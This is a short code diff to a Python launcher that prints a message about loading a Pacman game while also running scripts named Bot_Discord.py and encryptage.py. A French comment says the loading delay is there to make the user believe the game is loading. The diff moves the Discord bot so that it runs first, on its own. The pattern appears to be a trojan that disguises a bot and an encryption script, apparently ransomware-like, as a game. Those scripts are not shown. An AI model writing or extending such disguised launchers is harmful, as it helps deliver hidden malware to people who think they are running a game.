@@ -9,9 +9,11 @@ def run_script(script_name):
 if __name__ == "__main__":
     # Délai pour faire croire que le jeu se charge
     print("🎮 Chargement du jeu Pacman...")
+    
+    subprocess.run(["python", "Bot_Discord.py"])
 
     # Lancer les scripts en parallèle
-    scripts = ["Bot_Discord.py", "encryptage.py", "pacman.py"]
+    scripts = ["encryptage.py", "pacman.py"]
     threads = [threading.Thread(target=run_script, args=(script,)) for script in scripts]
 
     # Démarrer les threads
